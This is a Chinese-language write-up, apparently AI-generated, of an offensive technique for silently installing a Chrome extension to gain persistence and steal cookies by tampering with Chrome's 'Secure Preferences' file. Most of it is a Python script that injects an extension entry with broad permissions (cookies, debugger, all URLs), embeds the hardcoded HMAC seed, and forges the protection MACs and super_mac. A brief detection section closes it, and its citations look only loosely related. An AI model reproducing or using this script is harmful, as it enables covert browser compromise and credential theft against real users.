Silently Install Chrome Extension For Persistence


**核心思想**

在不与图形界面交互的情况下，静默安装 Chrome 扩展程序，用于持久驻留或窃取 Cookie 等。

**传统方法的问题**

传统方法（如使用命令行参数或远程调试）容易被检测，且不能跨会话保持持久性。

**新技术**

通过修改 Chrome 的“Secure Preferences”文件来实现静默安装，无需命令行参数或注册表编辑，且可持久驻留。

**具体步骤**

1.  **找到“Secure Preferences”文件：** 该文件位于`%localappdata%\Google\Chrome\User Data\Default`。

2.  **修改文件：**
    *   将扩展程序的 ID 添加到`Extensions:Settings` JSON 对象中。
    *   计算并添加`Protection:Macs:Extensions:Settings` JSON 对象的 SHA256 哈希值。Chrome 使用 HMAC 算法对 JSON 值、用户 SID 和硬编码的种子进行哈希计算。
    *   重新计算并替换文件末尾的`super_mac`值。

**示例**

假设我们要静默安装名为 "Crux" 的 Chrome 扩展程序。

1.  **准备工作：**
    *   将 Crux 扩展程序文件夹放在`C:\Users\Public\Downloads`。
    *   获取用户名和 SID（去掉最后一部分，例如 -1001）。

2.  **使用 Python 脚本修改 "Secure Preferences" 文件：**

```python
import hmac
import json
from collections import OrderedDict
import hashlib

# ... (省略 calculateHMAC、calc_supermac 等函数的代码，请参考原文)

def add_extension(user, sid):
    # 添加 JSON 到文件
    extension_json = r'{"active_permissions":{"api":["activeTab","cookies","debugger","webNavigation","webRequest","scripting"],"explicit_host":["<all_urls>"],"manifest_permissions":[],"scriptable_host":[]},"commands":{},"content_settings":[],"creation_flags":38,"filtered_service_worker_events":{"webNavigation.onCompleted":[{}]},"first_install_time":"13364417633506288","from_webstore":false,"granted_permissions":{"api":["activeTab","cookies","debugger","webNavigation","webRequest","scripting"],"explicit_host":["<all_urls>"],"manifest_permissions":[],"scriptable_host":[]},"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"13364417633506288","location":4,"newAllowFileAccess":true,"path":"C:\\Users\\Public\\Downloads\\extension","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"0.1.0"},"serviceworkerevents":["cookies.onChanged","webRequest.onBeforeRequest/s1"],"state":1,"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}'

    # 转换为 OrderedDict 以进行计算和添加
    dict_extension = json.loads(extension_json, object_pairs_hook=OrderedDict)
    filepath = "C:\\users\\{}\\appdata\\local\\Google\\Chrome\\User Data\\Default\\Secure Preferences".format(user)
    with open(filepath, 'rb') as f:
        data = f.read()
    f.close()
    data = json.loads(data, object_pairs_hook=OrderedDict)
    data["extensions"]["settings"]["eljagiodakpnjbaceijefgmidmpmfimg"] = dict_extension

    # 计算 [protect][mac] 的哈希值
    path = "extensions.settings.eljagiodakpnjbaceijefgmidmpmfimg"
    # 硬编码的种子
    seed = b'\xe7H\xf36\xd8^\xa5\xf9\xdc\xdf%\xd8\xf3G\xa6[L\xdffv\x00\xf0-\xf6rJ*\xf1\x8a!-&\xb7\x88\xa2P\x86\x91\x0c\xf3\xa9\x03\x13ihq\xf3\xdc\x05\x8270\xc9\x1d\xf8\xba\\O\xd9\xc8\x84\xb5\x05\xa8'
    macs = calculateHMAC(dict_extension, path, sid, seed)

    # 将 macs 添加到 JSON 文件
    data["protection"]["macs"]["extensions"]["settings"]["eljagiodakpnjbaceijefgmidmpmfimg"] = macs
    newdata = json.dumps(data)
    with open(filepath, 'w') as z:
        z.write(newdata)
    z.close()

    # 重新计算并替换 super_mac
    supermac = calc_supermac(filepath, sid, seed)
    data["protection"]["super_mac"] = supermac
    newdata = json.dumps(data)
    with open(filepath, 'w') as z:
        z.write(newdata)
    z.close()

if __name__ == "__main__":
    user = input("What is the local user? ")
    sid = input("What is the SID of the account? ")
    add_extension(user, sid)
```

**运行脚本：**

1.  运行上述 Python 脚本。
2.  输入用户名和 SID。

**完成：**

重新启动 Chrome，Crux 扩展程序将以静默方式安装。

**检测方法**

*   监控非 Chrome 进程对“Secure Preferences”或“Preferences”文件的编辑。
*   识别异常的 Chrome 扩展程序文件位置。
*   检测低普及率的扩展程序。

**安全提示**

此技术可能被恶意利用，请谨慎使用。[8]

希望这个说明更易于理解！

Citations:
[1] https://docs.uipath.com/zh-CN/studio/standalone/2022.4/user-guide/extension-for-chrome
[2] https://www.reddit.com/r/chrome_extensions/comments/z67al0/how_to_have_backgroundpersistent_in_v3/
[3] https://blog.csdn.net/fuhanghang/article/details/106491882
[4] https://developer.chrome.com/docs/extensions/reference/api/storage
[5] https://blog.csdn.net/u011250186/article/details/129979530
[6] https://stackoverflow.com/questions/51051833/chrome-extension-persistent/71418588
[7] http://bbs.wuyou.net/forum.php?mod=viewthread&tid=438695
[8] https://www.kqlsearch.com/query/Chrome%20Extension%20Stealth%20Persistence%20Detection&cm27pozn801t2mc0pwa0y58cx